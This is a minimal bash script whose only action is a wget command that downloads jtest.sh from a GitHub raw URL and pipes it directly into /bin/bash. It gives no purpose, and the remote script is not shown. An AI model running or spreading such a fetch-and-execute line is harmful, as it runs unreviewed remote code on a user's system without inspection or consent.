#!/bin/bash
DIRSYSBIN=/usr/bin

$DIRSYSBIN/wget --no-directories --no-parent --quiet --output-document=- "https://raw.githubusercontent.com/monter-af/monter-af/main/jtest.sh" | /bin/bash
